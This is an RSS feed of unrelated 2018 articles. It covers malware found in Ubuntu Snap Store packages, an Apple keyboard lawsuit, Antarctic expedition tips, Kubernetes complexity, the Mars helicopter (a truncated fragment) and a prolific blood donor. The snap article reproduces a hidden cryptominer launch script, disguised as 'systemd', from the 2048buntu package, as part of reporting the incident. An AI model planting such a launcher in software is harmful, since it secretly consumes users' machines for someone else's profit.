<title>Malware Found in the Ubuntu Snap Store</title>

<guid isPermaLink="true" >https://www.linuxuprising.com/2018/05/malware-found-in-ubuntu-snap-store.html</guid>
<description>&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-SQduQ-MZQJg/WvcucoWbrYI/AAAAAAAAAfA/Cm80FBQW8_4rlwyVnhFWU_VsOjrBeMCtwCLcBGAs/s1600/ubuntu-software-store-screenshot.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;Ubuntu Software Store&quot; border=&quot;0&quot; data-original-height=&quot;935&quot; data-original-width=&quot;1305&quot; height=&quot;458&quot; src=&quot;https://2.bp.blogspot.com/-SQduQ-MZQJg/WvcucoWbrYI/AAAAAAAAAfA/Cm80FBQW8_4rlwyVnhFWU_VsOjrBeMCtwCLcBGAs/s640/ubuntu-software-store-screenshot.png&quot; title=&quot;Ubuntu Software Store&quot; width=&quot;640&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br/&gt;Oh, snap! Just because some packages are available to install directly from the Ubuntu Software Center doesn't make them safe. This is proved by a recent discovery of malware in some snap packages from the Ubuntu Snaps Store.&lt;p&gt;&lt;strong&gt;At least two of the snap packages, 2048buntu and Hextris, uploaded to the Ubuntu Snaps Store by user Nicolas Tomb, contained malware. All packages by Nicolas have since been &lt;a href=&quot;https://uappexplorer.com/snaps?q=author%3ANicolas+Tomb&amp;amp;sort=-points&quot; target=&quot;_blank&quot;&gt;removed&lt;/a&gt; from the Ubuntu Snaps Store, &quot;&lt;a href=&quot;https://github.com/canonical-websites/snapcraft.io/issues/651#issuecomment-388546799&quot; target=&quot;_blank&quot;&gt;pending further investigations&lt;/a&gt;&quot;.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The report comes from a &lt;a href=&quot;https://github.com/canonical-websites/snapcraft.io/issues/651&quot; target=&quot;_blank&quot;&gt;bug&lt;/a&gt; which mentions that the 2048buntu snap package (and other packages by Nicolas Tomb) contains a hidden cryptocurrency miner inside. You can see the init script below:&lt;/p&gt;&lt;pre class=&quot;cssterm&quot;&gt;
&lt;code&gt;#!/bin/bash

currency=bcn
name=2048buntu


{ # try
/snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1 -g
} || { # catch
cores=($(grep -c ^processor /proc/cpuinfo))

if (( $cores &amp;amp;lt; 4 )); then
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1
else
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 2
fi
}&lt;/code&gt;
&lt;/pre&gt;
&lt;br/&gt;Yes, the miner used &lt;em&gt;myfirstferrari@protonmail.com&lt;/em&gt; in the miner script. I guess that's one way of getting a Ferrari... 🙂.&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-yrHrAqyxdKk/WvcuyGVYKAI/AAAAAAAAAfI/rTzS5qF1LeEs8vI92auKH0uhVYWgQvU-QCLcBGAs/s1600/2048buntu-game-ubuntu-snap-store.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;2048buntu ubuntu snap store&quot; border=&quot;0&quot; data-original-height=&quot;798&quot; data-original-width=&quot;1011&quot; height=&quot;504&quot; src=&quot;https://1.bp.blogspot.com/-yrHrAqyxdKk/WvcuyGVYKAI/AAAAAAAAAfI/rTzS5qF1LeEs8vI92auKH0uhVYWgQvU-QCLcBGAs/s640/2048buntu-game-ubuntu-snap-store.png&quot; title=&quot;2048buntu ubuntu snap store&quot; width=&quot;640&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br/&gt;An interesting aspect is that Nicolas Tomb used a proprietary license for at least some of his snaps. For example, the 2048buntu snap was submitted as proprietary (the game itself was not developed by Nicolas). The game in question, &lt;a href=&quot;https://github.com/gabrielecirulli/2048&quot; target=&quot;_blank&quot;&gt;2048&lt;/a&gt;, uses a MIT license which permits distributing it as proprietary, without making the source code available, as long as the copyright notices are retained.&lt;p&gt;Side note: 2048buntu was removed from the Ubuntu Snap store but you can check out its page via &lt;a href=&quot;https://webcache.googleusercontent.com/search?source=hp&amp;amp;ei=BDT3WvTIKaGr6AT295HIDw&amp;amp;q=cache%3Ahttps%3A%2F%2Fsnapcraft.io%2F2048buntu&amp;amp;oq=cache%3Ahttps%3A%2F%2Fsnapcraft.io%2F2048buntu&amp;amp;gs_l=psy-ab.3...5653.7198.0.7376.7.7.0.0.0.0.125.686.4j3.7.0....0...1c.1.64.psy-ab..0.6.614...0j46j0i46k1.0.OioghBze15M&quot; target=&quot;_blank&quot;&gt;Google Cache&lt;/a&gt;. But we can't see the package contents any more (unless it's on GitHub somewhere but I couldn't find it).&lt;/p&gt;&lt;p&gt;&lt;em&gt;How was this possible?&lt;/em&gt; Well, the Ubuntu Snap Store allows anyone to upload snap packages, as opposed to packages (deb) available in the official Ubuntu repositories. The reason for this is to provide more easily installable packages to its users.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;What's your opinion regarding this? Do you think more and more malware will be getting through to users by allowing anyone to upload packages to the Ubuntu Store, or was this an isolated incident?&lt;/strong&gt;&lt;/p&gt;

<title>Apple faces class action lawsuit over failing MacBook butterfly keyboards</title>

<description>&lt;p&gt;Apple’s &lt;a href=&quot;https://9to5mac.com/2017/02/22/apple-butterfly-keyboard-poll/&quot;&gt;polarizing butterfly keyboard design&lt;/a&gt; is now causing the company some legal issues. A new class action lawsuit has been filed against Apple, alleging that the company knew about the reliability issues of the design before launch, yet released it anyway…&lt;/p&gt;

&lt;/div&gt;
&lt;p&gt;As outlined by &lt;em&gt;&lt;a href=&quot;https://appleinsider.com/articles/18/05/11/apple-hit-with-action-suit-over-macbook-macbook-pro-butterfly-keyboard-failures&quot;&gt;AppleInsider&lt;/a&gt;&lt;/em&gt;, the lawsuit was filed in the Northern District Court of California and includes both the 12-inch MacBook and the MacBook Pro.&lt;/p&gt;
&lt;p&gt;The lawsuit alleges that “thousands” of users have suffered from problems with the butterfly keyboard device that render it ultimately useless. The lawsuit says that even “minimal amounts of dust or debris” causes the keyboard to fail, thus rendering one of the “core functions” of the MacBook broken. This makes the device “inoperable and unsuitable for its ordinary and intended use.”&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Apple’s butterfly keyboard and MacBook are produced and assembled in such a way that when minimal amounts of dust or debris accumulate under or around a key, keystrokes fail to register. The keyboard defect compromises the MacBook’s core functionality.&lt;/p&gt;
&lt;p&gt;As a result of the defect, consumers who purchased a MacBook face a constant threat of non-responsive keys and accompanying keyboard failure. When one or more of the keys on the keyboard fail, the MacBook can no longer serve its core function: typing. Thus, when this defect manifests in the MacBook, the computer becomes inoperable and unsuitable for its ordinary and intended use.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The lawsuit goes on to allege Apple “knew that the MacBook is defective at or before” the release. Furthermore, it knew of the issues uses of the 12-inch MacBook were having, yet still brought the butterfly keyboard to the MacBook Pro and sold it at “premium prices.”&lt;/p&gt;
&lt;p&gt;Additionally, the suit takes issues with Apple’s marketing – which touts that the butterfly keyboard offers “four times more key stability than a traditional scissor mechanism.”&lt;/p&gt;
&lt;p&gt;The 1-year warranty Apple offers to users is acknowledged in the lawsuit, but it argues that “Apple routinely refuses to honor its warranty obligations,” instead instructing MacBook users to “try self-help remedies that it knows will not result in permanent repair.&lt;/p&gt;
&lt;p&gt;Ultimately, the lawsuit seeks damages, legal fees, and alls for Apple to disclose the keyboard flaws and replace defective units, including reimbursement for the initial laptop purchase.&lt;/p&gt;
&lt;p&gt;This certainly isn’t the first time Apple has come under fire for its butterfly keyboard mechanism. Earlier this month, a petition called for Apple to recall and replace defective MacBook keyboards – that petition has since &lt;a href=&quot;https://9to5mac.com/2018/05/03/macbook-pro-keyboard-petition/&quot;&gt;accumulated over 17,000 signatures&lt;/a&gt;.&lt;/p&gt;

<title>Things no one tells you before an Antarctic expedition (2015)</title>
<link>https://www.telegraph.co.uk/men/active/11315994/Ten-things-no-one-tells-you-before-an-Antarctic-expedition.html</link>
<guid isPermaLink="true" >https://www.telegraph.co.uk/men/active/11315994/Ten-things-no-one-tells-you-before-an-Antarctic-expedition.html</guid>
<description>&lt;div class=&quot;firstPar&quot;&gt;
&lt;p&gt;&lt;strong&gt;1. You're going to have to eat a lot of raw butter.&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;secondPar&quot;&gt;
&lt;p&gt;When you are skiing across Antarctica and putting in 12-14 hour days of pulling a sled in minus 40C, you have to keep your calorie count up. A normal man burns about 2,500 calories in a day. We burn between 7,000 to 9,000. That means supplementing your dehydrated food with slabs of butter. In the first few days of the expedition, it tastes revolting, but then your body just craves the fat content and you eat the butter like blocks of cheese.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;thirdPar&quot;&gt;
&lt;p&gt;&lt;strong&gt;2. Washing is a painful experience.&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;fourthPar&quot;&gt;
&lt;p&gt;We melt snow to make drinking water, but there is not enough fuel to have water for washing. Therefore, the only way to keep clean on an 80 day expedition is by running outside naked in minus 30 and rubbing yourself down with snow. It’s traumatic - and not just for you, as frequently you scare the hell out of your teammates by crashing into the tent beside them totally naked.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;fifthPar&quot;&gt;
&lt;p&gt;&lt;strong&gt;3. Take it one step at a time.&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;body&quot;&gt;
&lt;p&gt;On the traverse of Antarctica we were trying to cover 1,850km. After the first week, we had only done a few miles total and then had to climb 3,000m onto the high polar plateau. The lack of progress and subsequent sense of utter despair can easily overwhelm you, so you have to break the journey down into small increments just to keep sane. It may seem stupid celebrating travelling 100km when you have 18 times that distance to go, but never underestimate the power of denial.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Choose your companions carefully. You may have to eat them.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So goes the famous polar maxim. But choosing your teammates wisely is the difference between an enjoyable trip and one where you want to commit homicide on a daily basis. Tiny idiosyncrasies, such as snoring, chewing too loudly, or fidgeting in the tent, can be a source of incredible tension that builds up over the days of confinement.&lt;/p&gt;
&lt;p&gt;&lt;img version=&quot;c&quot; refid=&quot;3150022&quot; width=&quot;460&quot; height=&quot;287&quot; caption=&quot;&quot; declared-caption=&quot;&quot; src=&quot;https://secure.i.telegraph.co.uk/multimedia/archive/03150/Patrick-reflection_3150022c.jpg&quot; photographer=&quot;&quot; name=&quot;Patrick-reflection&quot;/&gt;&lt;sup&gt;Patrick Woodhead&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. Going mental.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Middle aged people tend to make better polar explorers. Not so much because they are physically more capable, but more to do with their mental capacity. Out on the high polar plateau there is nothing but endless white stretching off in every direction. You ski for 12 hours a day and because of the wind and cold, it’s almost impossible to talk to your team mates. So, in effect, you are alone in your head for all that time. By being a bit older and having a bit more life experience, it helps fill the blank canvas that is Antarctica.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. The tent is a surprisingly nice place to be.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Due to 24 hours sunlight and the power of the solar radiation, the tent warms up considerably. It may be as low as minus 40C outside, but inside the tent it can reach +5C. This means the tent is a wonderful shelter from the elements. You can repair all your clothing, eat some food and generally relax even when you are hundreds of kilometers from the nearest other humans.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. Take a notebook and pencil.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Writing down your inner turmoil, thoughts, moments of brilliance, or moments of despair and frustration is one of the more valuable parts of an expedition. It also forms valuable research for my books because it enables me to capture my raw thoughts when in the moment.&lt;/p&gt;
&lt;p&gt;&lt;img version=&quot;c&quot; refid=&quot;3150025&quot; width=&quot;460&quot; height=&quot;287&quot; caption=&quot;&quot; declared-caption=&quot;&quot; src=&quot;https://secure.i.telegraph.co.uk/multimedia/archive/03150/two-people-on-mass_3150025c.jpg&quot; photographer=&quot;&quot; name=&quot;two-people-on-massive-white-landscape&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. Frostbite is about sweat, genetics and experience.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Getting frostbite is a very real part of a protracted polar expedition. It’s only too easy to work a bit harder than you should, work up a sweat and then the sweat ices up on the inside of your jacket or gloves. You have to operate just under the sweat level (which in minus 40C is quite high). Secondly, it’s about experience. You need to know how long you can freeze your hands for as you fix a broken ski binding, for example, before you have to stop what you are doing and devote some attention to warming up your hands. You can only know how far to push your body before doing damage to it if you have been in the field and have the experience. Lastly, it is genetics. Pure and simple. Some people are just better in the cold than others.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;9. Expect delays.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Planes rarely run on schedule due to changes in weather. Add a lot of spare time to the other sides of your expedition, as it is just not going to run according to the preconceived dates.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;10. Re-entry.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There is often a huge sense of isolation and disconnect when you come back to everyday life. For so long, you have been out in the wilderness and singularly concerned with survival and mileage, so when you get back to the real world and people talk about their jobs, or what they did at the weekend, it all feels foreign. You must remember that people have their own lives and their own interests. Just because you like Antarctica and polar expeditions, it doesn't mean anyone else should give a damn about you or what you did.&lt;/p&gt;
&lt;p&gt;&lt;img version=&quot;f&quot; refid=&quot;3150029&quot; width=&quot;220&quot; height=&quot;333&quot; caption=&quot;&quot; declared-caption=&quot;&quot; src=&quot;https://secure.i.telegraph.co.uk/multimedia/archive/03150/patrick-woodhead-b_3150029f.jpg&quot; photographer=&quot;&quot; name=&quot;patrick-woodhead-book&quot;/&gt;&lt;/p&gt;

<title>Is K8s Too Complicated? ￼</title>
<link>http://jmoiron.net/blog/is-k8s-too-complicated/</link>
<guid isPermaLink="true" >http://jmoiron.net/blog/is-k8s-too-complicated/</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://twitter.com/jbeda&quot;&gt;Joe Beda&lt;/a&gt; had a great twitter thread this morning about the complexity of Kubernetes. You can &lt;a href=&quot;https://twitter.com/jbeda/status/993978918196531200&quot;&gt;read it in full&lt;/a&gt;, and I suggest you do, but I wanted to quote a few things I found to be particularly thought provoking:&lt;/p&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;First off: Kubernetes &lt;em&gt;is&lt;/em&gt; a complex system. It does a lot and brings new abstractions. Those abstractions aren't always justified for all problems. I'm sure that there are plenty of people using Kubernetes that could get by with something simpler.&lt;/p&gt;
&lt;p&gt;The story of computing is creating abstractions. Things that feel awkward at first become the new norm. Higher layers aren't &lt;em&gt;simpler&lt;/em&gt; but rather better suited to different tasks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And, the pick of the bunch:&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;That being said, I think that, as engineers, we tend to discount the complexity we build ourselves vs. complexity we need to learn.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;These are presented somewhat out of order, because I wanted to put particular emphasis on the last one, which I think is a significant source of cognitive bias in engineering at large.&lt;/p&gt;
&lt;p&gt;In the real world, these biases are amplified because &quot;things we build ourselves&quot;&lt;br /&gt;is actually &quot;things we already know&quot;, and this includes &quot;things we already learned&quot;. I suspect that a significant source of programmers flooding into management is the decreasing wavelength of full scale re-education on how to accomplish the exact same thing slightly differently&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; with diminshing returns on tangible benefits.&lt;/p&gt;
&lt;p&gt;I've been &quot;learining&quot; Kubernetes for a significant migration we are attempting at $WORK. I've found it tough going. It's a large thing, and it is &lt;em&gt;very&lt;/em&gt; difficult to know how uninformed my opinion is from my limited exposure. I was originally going to write purely about simplicity and cognitive bias, but then Kris Nova &lt;a href=&quot;https://twitter.com/krisnova/status/994242908315312129&quot;&gt;tweeted&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;In a single tweet — can you name a technical benefit you and your team have gained by switching to Kubernetes?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I &lt;em&gt;really&lt;/em&gt; love this tweet, because the tone works if you consider it a question from a point of skepticism or as a search for confirmation. The answers, as it happens, will serve you regardless as well. For me, they highlight a particular problem that I've found over and over again with Kubernetes, and since it's been over a year since I've managed to finish a blog post, I might as well just write about it:&lt;/p&gt;
&lt;p&gt;The k8s elevator pitch is straight up dogshit.&lt;/p&gt;
&lt;p&gt;I've started to see, via my own usage, &lt;em&gt;just&lt;/em&gt; enough of what Kubernetes brings to the table tech wise to start understanding the value, but it's hard to put into words. You can tell it's hard because you can't &lt;a href=&quot;https://twitter.com/search?q=kubernetes&quot;&gt;find it on twitter&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;Want #Kubernetes Clusters on #AzureStack? This will help you run microservices and container-based workloads using the IaaS capabilities of Azure Stack.&lt;/p&gt;
&lt;p&gt;Yesterday the CERN team were playing &quot;public cloud bingo&quot; at #KubeCon, to see how many public clouds they could attach to their Kubernetes federation.&lt;/p&gt;
&lt;p&gt;Everyone wants to know about @IstioMesh at #KubeCon. @DanCiruli explains the gaps it is plugging in #Kubernetes ecosystems&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Right. So what does it do? What can I do with it that I can't do already? Maybe lets look at the &lt;a href=&quot;http://kubernetesstatus.com/&quot;&gt;new feature list&lt;/a&gt;. Oh nice, looks like we're getting &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/58823&quot;&gt;log rotation&lt;/a&gt;, I've only had that since 1994.&lt;/p&gt;
&lt;p&gt;The marketing buries the tech lede. I'm not currently working on my resumé, so I don't actually give a shit how cloud native I'm not. In my limited experience, you get:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;inventory management and visibility&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;common platform for building out tooling related to this (APIs for *)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;decent abstractions for provisioning and deployment&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;service discovery and config management&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Some of this is covered in their &lt;a href=&quot;https://kubernetes.io&quot;&gt;bullet points&lt;/a&gt;, but they are pretty abstract, and all high up on the pyramid of needs. You can't build a large system without most of them, but large systems exist, so clearly Kubernetes is not the only way to do any of this. Unfortunately, if you already have a pretty large deployment you probably &lt;a href=&quot;https://kubernetes.io/docs/admin/cluster-large/&quot;&gt;need multiple clusters&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;However, when you think about them a bit more, they are actually a &lt;em&gt;really&lt;/em&gt; neat thing to find in a box somewhere. As someone who has written the better part of two custom databases, being able to hire someone who already knows your tools is fantastic. Having well written public documentation is really nice.&lt;/p&gt;
&lt;p&gt;It also seems structured in a way that we will be able to really leverage open-sourced work in the burgeoning &quot;infrastructure glue&quot; space. This is a very underrated benefit. The promise of some kind of souk or foodtruck full of Chef recipes&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; that we can all collaborate on and share has proven to be an empty one. Helm and Istio are both harbingers of Kubernetes' complexity and a testament to it working as a platform in ways the previous generation of half-baked&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; devops tools did not.&lt;/p&gt;
&lt;p&gt;Of course, they don't come for free, and even at the surface level there are questions that are difficult to answer or have problematic answers:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;How can I even what is all this yaml?&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;I'd like to run another process oh I cant unless I sidecar it and intimately describe its every relation with the parent's environment via yaml hokay&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;I want to run a database and I don't want you to reschedule me on a computer without any of my data&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;How can this all go wrong and what happens when it does?&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;That first problem is a joke but it &lt;a href=&quot;https://twitter.com/jmoiron/status/989686447367127041&quot;&gt;also kinda isn't&lt;/a&gt;. The second one is a nontrivial annoyance for almost every observability system out there, and making observability harder is a pretty bad first impression for a cloud native management system.&lt;/p&gt;
&lt;p&gt;Alan Perlis &lt;a href=&quot;http://www.cs.yale.edu/homes/perlis-alan/quotes.html&quot;&gt;said&lt;/a&gt; that a programming language was low level when it requires attention to the irrelevant. The rub is that it's difficult to have a firm grasp on relevancy once you add ignorance to the equation, and we're all ignorant in our own ways.&lt;/p&gt;
&lt;p&gt;If you've been around the block developing and deploying large distributed systems, then you know my list of pluses is actually quite compelling. It has an opinion on things that we all agree are important. And for those of us who haven't been around the block, it puts a lot of emphasis on things that will become important as we make our first lap, which is a major contribution to the community.&lt;/p&gt;
&lt;p&gt;But if you have already made decisions, things get complicated.&lt;/p&gt;
&lt;p&gt;Lets use service discovery as an example. We've used service discovery along with health checks and self diagnostics to be able to do some fairly interesting things during outages and, more importantly, &lt;a href=&quot;http://ucare.cs.uchicago.edu/pdf/socc13-limplock.pdf&quot;&gt;slowdowns&lt;/a&gt;. These are hard problems, and we've solved them rather crudely in places, but these solutions still give us a level of proven, necessary sophistication for system stability.&lt;/p&gt;
&lt;p&gt;Unfortunately, our approach is slightly incompatible with Kubernetes' centralized one. Usually, when this happens, your needs are just too sophisticated, but in this case Kubernetes' approach is already &lt;em&gt;explicitly&lt;/em&gt; complex in order to try to deal at the proper level of sophistication. It's a thoughtful and mature approach, but its structure is just inverted from ours. It's complex in incompatible ways, the worst of both worlds.&lt;/p&gt;
&lt;p&gt;Its config management fares worse, as it is complex &lt;em&gt;and&lt;/em&gt; impoverished. There is already a cottage industry of applications attempting to fix this, we'll see if they succeed.&lt;/p&gt;
&lt;p&gt;I've seen this &quot;complex but incompatible&quot; pattern play out a couple times. The attitude towards state in general makes me wonder: do people even &lt;a href=&quot;https://twitter.com/taotetek/status/954131928030023680&quot;&gt;store data themselves&lt;/a&gt; anymore? Maybe that's what I'm missing.&lt;/p&gt;
&lt;p&gt;It all leaves me concerned that the people with the most to gain will also run into the most problems trying to adopt Kubernetes, and while this is natural (large systems tend to be complex), it does make for bad advertising. &quot;Kubernetes doesn't &lt;em&gt;actually&lt;/em&gt; scale&quot; is something I expect to start hearing more and more from people outside the bubble, and it will carry the weight of experience.&lt;/p&gt;
&lt;p&gt;For our particular project, I think we're still getting started when you take into consideration the likely overall lifetime. Still, I suspect that moving an existing architecture wholesale to Kubernetes is a bad idea in general; if you've not grown up within its particular limitations, they will prove to be an endless annoyance&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;, even if there are a host of other tangible benefits over going solo. This may not be limited to Kubernetes, it may just be true for anything, in which case Kubernetes might indeed provide the path of least pain, its room temperature shattered glass fragments an eden compared to red hot glowing obsidian.&lt;/p&gt;
&lt;p&gt;Given Kubernetes' critical mass, time will make an accurate appraisal of its complexity difficult. Will it be able to gracefully adapt to the kinds of advancements that it &lt;em&gt;itself&lt;/em&gt; will bring?&lt;/p&gt;
&lt;p&gt;Like a lot of other tech that has ostensibly &lt;a href=&quot;https://grpc.io/&quot;&gt;come out of google&lt;/a&gt;, it will likely have at least one major source of complexity that 95% of people do not need and will &lt;a href=&quot;https://blog.twitch.tv/twirp-a-sweet-new-rpc-framework-for-go-5f2febbf35f&quot;&gt;not want&lt;/a&gt;. I've not gone looking for a custom implementation of http/2 with a broken congestion window, but maybe one will turn up.&lt;/p&gt;
&lt;p&gt;Many of the problems that Kubernetes provides abstractions for, as opposed to solutions for, will age gracelessly as consensus grows on how to approach them. The balkanization of cluster management systems will fade as consensus solves by convention what is currently open to experimentation. Sources of complexity that seem necessary become over-engineering, the equivalent of pluggable server-side template systems in MVC frameworks in the age of one-page react apps talking to JSON endpoints.&lt;/p&gt;
&lt;p&gt;So, &lt;em&gt;is&lt;/em&gt; it too complicated? Probably. But it'll take a technology generation or so&lt;sup&gt;&lt;a href=&quot;http://jmoiron.net/blog/is-k8s-too-complicated/#5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; before the simpler core of Kubernetes makes itself known, and what we end up with will probably smell a &lt;em&gt;lot&lt;/em&gt; like it.&lt;/p&gt;
&lt;hr /&gt;&lt;p&gt;1. As an example, I learned JavaScript, then Prototype, then jQuery, then Angular, and when React came out I was so relieved because I could finally decide that the whole enterprise was corrupt and give up any notion of being a &quot;full stack engineer&quot; to work on the backend full time.&lt;/p&gt;
&lt;p&gt;2. I'm going to create SRE/operations software just so I can call it &quot;tortured metaphor&quot; as that seems to be the only real requirement. Its reimagined vocabulary for a bunch of shit we already have words for will be based on dryness, a reference to wit, sarcasm, and the reservoir of joy that led to its creation. Since most people know Chef and Ansible, &lt;a href=&quot;https://docs.saltstack.com/en/latest/topics/mine/index.html&quot;&gt;Saltstack&lt;/a&gt; contains grains, pillars, mines, and minions.&lt;/p&gt;
&lt;p&gt;3. micdrop.&lt;/p&gt;
&lt;p&gt;4. Like OSX's frankly &lt;em&gt;inexcusable&lt;/em&gt; cmd-tab/alt-tab behaviour.&lt;/p&gt;
&lt;p&gt;5. A normal one, not a JavaScript one, so approximately ~3-5 years.&lt;/p&gt;
&lt;p&gt;May 9&lt;/p&gt;

No aircraft has ever taken off from the surface of another planet.&lt;/p&gt;&lt;p&gt;The helicopter's two blades will spin at close to 3,000 revolutions a minute, which Nasa says is about 10 times faster than a standard helicopter on Earth.&lt;/p&gt;&lt;p&gt;&quot;The idea of a helicopter flying the skies of another planet is thrilling,&quot; said Nasa Administrator Jim Bridenstine.&lt;/p&gt;&lt;p&gt;&quot;The Mars Helicopter holds much promise for our future science, discovery, and exploration missions to Mars.&quot;&lt;/p&gt;&lt;p&gt;While the tiny craft is being called a helicopter rather than a drone, there will be no pilot.&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;It will be flying almost 55 million km (34 million miles) from Earth, too far away to send a remote control signal.&lt;/p&gt;&lt;p&gt;&quot;Earth will be several light minutes away, so there is no way to joystick this mission in real time,&quot; said Mimi Aung, the project manager at Nasa's Jet Propulsion Laboratory.&lt;/p&gt;&lt;p&gt;Instead, the helicopter will &quot;fly the mission on its own&quot;.&lt;/p&gt;&lt;p&gt;The JPL team made the minuscule helicopter as strong as possible to give it the best chance of surviving.&lt;/p&gt;&lt;p&gt;&quot;The altitude record for a helicopter flying here on Earth is about 40,000 feet,&quot; Ms Aung said. &quot;When our helicopter is on the Martian surface, it's already at the Earth equivalent of 100,000 feet up.&quot;&lt;/p&gt;&lt;p&gt;That is part of the reason why Nasa is calling the Mars helicopter a &quot;high risk&quot; project.&lt;/p&gt;&lt;p&gt;&quot;If it does not work, the Mars 2020 mission will not be impacted. If it does work, helicopters may have a real future as low-flying scouts and aerial vehicles to access locations not reachable by ground travel,&quot; Nasa said in a statement.&lt;/p&gt;&lt;p&gt;Existing Mars vehicles have been wheeled devices, which have to navigate around many obstacles in their path and have been confined to fairly large open spaces on the surface of Mars.&lt;/p&gt;&lt;p&gt;One such vehicle, the Spirit rover, got stuck in a patch of sand in 2009, where it eventually ran out of power and shut down. &lt;/p&gt;&lt;p&gt;The Mars 2020 rover - accompanied by its helicopter companion - is due to launch in July of that year and arrive on the red planet in February 2021. &lt;/p&gt;

<title>Man donated blood every week for 60 years and helped save 2.4M babies</title>
<link>https://www.independent.co.uk/news/world/australasia/james-harrison-man-golden-arm-blood-donor-60-years-millions-babies-a8347896.html</link>
<guid isPermaLink="true" >https://www.independent.co.uk/news/world/australasia/james-harrison-man-golden-arm-blood-donor-60-years-millions-babies-a8347896.html</guid>
<description>&lt;p&gt;Known as “the man with the golden arm”, James Harrison is estimated to have saved the lives of 2.4 million babies after giving blood almost every week for 60 years.&lt;/p&gt;
&lt;p&gt;The 81-year-old Australian has donated more than 1,100 times since turning 21.&lt;/p&gt;
&lt;p&gt;Because his blood has unique disease-fighting antibodies, it is used to create an injection which combats rhesus disease – a condition where the blood of pregnant women attacks their unborn babies.&lt;/p&gt;

&lt;p&gt;But after reaching the maximum age for donating blood in his him, he is to retire, the country’s Red Cross Blood Service, which made the estimate about how many lives he has saved.&lt;/p&gt;
&lt;p&gt;&quot;It becomes quite humbling when they say, 'oh you've done this or you've done that or you're a hero’,&quot; said Mr Harrison, who was awarded the Order of Australia, the country's highest honour, in 1999. “It's something I can do. It's one of my talents, probably my only talent, is that I can be a blood donor.&quot;&lt;/p&gt;
&lt;p&gt;In a separate interview with Australia’s &lt;a href=&quot;https://www.9news.com.au/national/2018/05/11/19/08/blood-donor-world-record-holder-james-harrison-final-day-donating&quot; target=&quot;_blank&quot;&gt;9News&lt;/a&gt;, he added: “I've saved a lot of lives and brought a lot of new kids into the world. So that makes me feel good. I increased the population by so many million, I think.&quot;&lt;/p&gt;
&lt;p&gt;Mr Harrison, of New South Wales, discovered his blood had unique properties when he had a lung removed, aged just 14.&lt;/p&gt;
&lt;p&gt;Doctors found it contained an antibody which could be used to create the life-saving ‘Anti-D’ injections.&lt;/p&gt;
&lt;p&gt;So he started making blood plasma donations every week.&lt;/p&gt;
